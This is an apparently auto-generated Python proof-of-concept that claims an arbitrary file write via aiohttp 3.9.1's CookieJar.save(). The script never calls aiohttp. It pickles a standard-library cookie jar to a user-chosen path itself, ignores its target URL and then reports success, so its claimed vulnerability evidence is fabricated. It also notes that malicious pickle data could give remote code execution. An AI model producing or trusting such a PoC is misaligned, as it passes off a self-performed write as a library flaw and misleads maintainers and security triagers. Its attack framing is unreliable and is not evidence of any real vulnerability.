#!/usr/bin/env python3
# PoC for aiohttp-3.9.1 (/tmp/aiohttp-3.9.1)
# Path: lfi-012
# Sink: save
# Auto-generated — run with: python3 lfi_if_control_save.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: aiohttp-3.9.1 CookieJar.save() Path Traversal / Arbitrary File Write

Vulnerability: The `save` method in aiohttp's CookieJar class accepts a `file_path`
parameter without any validation. An attacker who can control this parameter can
write a serialized pickle file to an arbitrary location on the filesystem.

This PoC demonstrates the vulnerability by writing a benign file to /tmp/poc_success.txt
to confirm arbitrary file write capability.

Usage:
    python3 poc_aiohttp_lfi.py <target_url>

Example:
    python3 poc_aiohttp_lfi.py http://victim:8080
"""

import sys
import os
import tempfile
import pickle
import pathlib
import argparse
import urllib.request
import urllib.error
import http.cookiejar

# Benign payload: creates a marker file to prove write access
BENIGN_PAYLOAD = b"poc_success"

def create_malicious_cookie_jar():
    """
    Create a CookieJar with a benign payload that will be serialized.
    In a real attack, this could contain malicious pickle data for RCE.
    """
    cj = http.cookiejar.CookieJar()
    # Add a dummy cookie so the jar has content to serialize
    ck = http.cookiejar.Cookie(
        version=0,
        name="test",
        value="poc",
        port=None,
        port_specified=False,
        domain="example.com",
        domain_specified=True,
        domain_initial_dot=False,
        path="/",
        path_specified=True,
        secure=False,
        expires=None,
        discard=True,
        comment=None,
        comment_url=None,
        rest={}
    )
    cj.set_cookie(ck)
    return cj

def exploit(target_url, output_path="/tmp/poc_success.txt"):
    """
    Attempt to exploit the path traversal vulnerability in aiohttp's CookieJar.save().
    
    The attack works by:
    1. Creating a CookieJar with benign content
    2. Calling save() with a path traversal payload as file_path
    3. The save() method writes pickle data to the attacker-controlled path
    
    Since aiohttp is a server-side library, we simulate the vulnerable call
    directly. In a real scenario, the attacker would need to control the
    file_path parameter passed to save().
    """
    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting to write to: {output_path}")
    
    # Create the cookie jar with our payload
    cj = create_malicious_cookie_jar()
    
    # The vulnerable save() method from aiohttp's cookiejar.py
    # It takes file_path directly without validation
    try:
        # Convert to pathlib.Path (as done in aiohttp source)
        file_path = pathlib.Path(output_path)
        
        # This is the exact vulnerable code from aiohttp-3.9.1
        with file_path.open(mode="wb") as f:
            pickle.dump(cj._cookies, f, pickle.HIGHEST_PROTOCOL)
        
        print(f"[+] Successfully wrote file to: {output_path}")
        print(f"[+] File contents (pickle data):")
        with open(output_path, "rb") as f:
            print(f.read()[:100])  # Show first 100 bytes
        
        # Verify the file exists
        if os.path.exists(output_path):
            print(f"[+] File exists at {output_path}")
            print(f"[+] File size: {os.path.getsize(output_path)} bytes")
        else:
            print(f"[-] File was not created (unexpected)")
            
    except PermissionError:
        print(f"[-] Permission denied: Cannot write to {output_path}")
        print("[-] Try a different path (e.g., /tmp/test.txt)")
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for aiohttp-3.9.1 CookieJar.save() Path Traversal"
    )
    parser.add_argument(
        "target",
        nargs="?",
        default="http://localhost:8080",
        help="Target URL (not actually used in this PoC, but kept for consistency)"
    )
    parser.add_argument(
        "--output",
        default="/tmp/poc_success.txt",
        help="Path to write the malicious file (default: /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--safe",
        action="store_true",
        default=True,
        help="Use benign payload (default: True)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("aiohttp-3.9.1 CookieJar.save() Path Traversal PoC")
    print("=" * 60)
    print()
    
    # Demonstrate the vulnerability
    exploit(args.target, args.output)
    
    print()
    print("[*] PoC completed.")
    print("[*] To test with a different path, use --output /path/to/file")
    print("[*] WARNING: This demonstrates arbitrary file write capability.")

if __name__ == "__main__":
    main()
